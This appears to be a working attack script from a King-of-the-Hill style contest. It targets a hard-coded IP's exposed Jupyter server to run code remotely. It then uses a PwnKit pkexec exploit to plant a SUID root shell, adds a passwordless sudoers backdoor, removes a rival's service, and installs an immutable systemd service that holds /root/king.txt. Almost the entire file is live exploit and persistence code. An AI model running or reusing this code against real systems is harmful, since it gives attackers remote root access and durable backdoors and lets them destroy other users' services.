#!/usr/bin/env python3
import base64
import json
import sys
import time

import requests
import websocket

TARGET = "159.223.68.133"
BASE = f"http://{TARGET}:8888"
KING_VALUE = "Milix"
ROOT_SHELL = "/tmp/milix-root"


def execute(code):
    session = requests.Session()
    session.get(BASE + "/tree", timeout=8)
    xsrf = session.cookies.get("_xsrf")
    response = session.post(
        BASE + "/api/kernels",
        headers={"X-XSRFToken": xsrf},
        json={},
        timeout=8,
    )
    response.raise_for_status()
    kernel_id = response.json()["id"]
    cookie = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
    ws = websocket.create_connection(
        f"ws://{TARGET}:8888/api/kernels/{kernel_id}/channels",
        cookie=cookie,
        origin=BASE,
        timeout=10,
    )
    msg_id = f"milix-{time.time_ns()}"
    ws.send(json.dumps({
        "header": {
            "msg_id": msg_id,
            "username": "milix",
            "session": "milix",
            "msg_type": "execute_request",
            "version": "5.3",
        },
        "parent_header": {},
        "metadata": {},
        "channel": "shell",
        "content": {
            "code": code,
            "silent": False,
            "store_history": False,
            "user_expressions": {},
            "allow_stdin": False,
            "stop_on_error": True,
        },
    }))
    output = []
    deadline = time.time() + 20
    while time.time() < deadline:
        message = json.loads(ws.recv())
        if message.get("parent_header", {}).get("msg_id") != msg_id:
            continue
        kind = message.get("msg_type") or message.get("header", {}).get("msg_type")
        content = message.get("content", {})
        if kind == "stream":
            output.append(content.get("text", ""))
        elif kind == "error":
            output.append("\n".join(content.get("traceback", [])))
        elif kind == "status" and content.get("execution_state") == "idle":
            break
    ws.close()
    try:
        session.delete(
            BASE + f"/api/kernels/{kernel_id}",
            headers={"X-XSRFToken": xsrf},
            timeout=5,
        )
    except requests.RequestException:
        pass
    return "".join(output)


def run_root_script(script):
    """Run a bash script as root via the SUID shell, avoiding quoting issues."""
    b64 = base64.b64encode(script.encode()).decode()
    payload = f'''import base64, subprocess
with open("/tmp/.mx_run.sh", "wb") as f:
    f.write(base64.b64decode("{b64}"))
r = subprocess.run(["{ROOT_SHELL}", "-p", "/tmp/.mx_run.sh"],
                   text=True, capture_output=True, timeout=30)
print(r.stdout)
print(r.stderr)
subprocess.run(["rm", "-f", "/tmp/.mx_run.sh"])
'''
    return execute(payload)


INSTALL_SCRIPT = r'''#!/bin/bash
# durable root: NOPASSWD sudo for jupyter_svc
chattr -i /etc/sudoers.d/zz-milix 2>/dev/null
printf 'jupyter_svc ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/zz-milix
chmod 440 /etc/sudoers.d/zz-milix

# remove known competitor keepers
systemctl stop zaara-king.service 2>/dev/null
systemctl disable zaara-king.service 2>/dev/null
rm -f /etc/systemd/system/zaara-king.service /usr/local/sbin/zaara-king.sh

# install Milix holder
chattr -i /usr/local/sbin/milix-kinghold.sh /etc/systemd/system/milix-kinghold.service 2>/dev/null
cat > /usr/local/sbin/milix-kinghold.sh <<'SH'
#!/bin/bash
while true; do
    chattr -i -a /root/king.txt 2>/dev/null
    printf 'Milix\n' > /root/king.txt
    chmod 644 /root/king.txt
    sleep 0.05
done
SH
chmod 700 /usr/local/sbin/milix-kinghold.sh
cat > /etc/systemd/system/milix-kinghold.service <<'UNIT'
[Unit]
Description=Milix king holder
After=multi-user.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/milix-kinghold.sh
Restart=always
RestartSec=0

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now milix-kinghold.service >/dev/null 2>&1
chattr +i /usr/local/sbin/milix-kinghold.sh /etc/systemd/system/milix-kinghold.service /etc/sudoers.d/zz-milix 2>/dev/null
sleep 1
echo "KING=$(cat /root/king.txt 2>&1)"
echo "SERVICE=$(systemctl is-active milix-kinghold.service 2>&1)"
'''

CHECK_SCRIPT = r'''#!/bin/bash
value=$(cat /root/king.txt 2>/dev/null)
state=$(systemctl is-active milix-kinghold.service 2>/dev/null)
if [ "$value" != "Milix" ] || [ "$state" != "active" ]; then
    chattr -i -a /root/king.txt 2>/dev/null
    printf 'Milix\n' > /root/king.txt
    systemctl restart milix-kinghold.service 2>/dev/null
fi
echo "KING=$(cat /root/king.txt 2>&1)"
echo "SERVICE=$(systemctl is-active milix-kinghold.service 2>&1)"
'''

ENUM = r'''import subprocess
print(subprocess.run(
    "ls -l /tmp/milix-root 2>&1; "
    "test -u /tmp/milix-root && /tmp/milix-root -p -c 'id; cat /root/king.txt'",
    shell=True, text=True, capture_output=True,
).stdout)
'''

PWNKIT = r'''import os, subprocess
work = "/tmp/.milix-pk"
os.makedirs(work + "/GCONV_PATH=.", exist_ok=True)
os.makedirs(work + "/milix", exist_ok=True)
source = r"""
#include <unistd.h>
#include <stdlib.h>
void gconv(void) {}
void gconv_init(void) {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/milix-root; chown root:root /tmp/milix-root; chmod 4755 /tmp/milix-root");
    _exit(0);
}
"""
open(work + "/payload.c", "w").write(source)
open(work + "/milix/gconv-modules", "w").write("module UTF-8// MILIX// payload 2\n")
open(work + "/GCONV_PATH=./milix", "w").close()
r = subprocess.run(
    ["gcc", "-shared", "-fPIC", work + "/payload.c", "-o", work + "/milix/payload.so"],
    text=True, capture_output=True,
)
print(r.stdout + r.stderr)
if r.returncode == 0:
    os.chdir(work)
    import ctypes
    libc = ctypes.CDLL("libc.so.6")
    argv = (ctypes.c_char_p * 1)(None)
    envp = (ctypes.c_char_p * 5)(b"milix", b"PATH=GCONV_PATH=.", b"CHARSET=MILIX", b"SHELL=milix", None)
    libc.execve(b"/usr/bin/pkexec", argv, envp)
'''


if __name__ == "__main__":
    if "--pwnkit" in sys.argv:
        print(execute(PWNKIT), end="")
    elif "--enum" in sys.argv:
        print(execute(ENUM), end="")
    elif "--install" in sys.argv:
        print(run_root_script(INSTALL_SCRIPT), end="")
    else:
        print(run_root_script(CHECK_SCRIPT), end="")
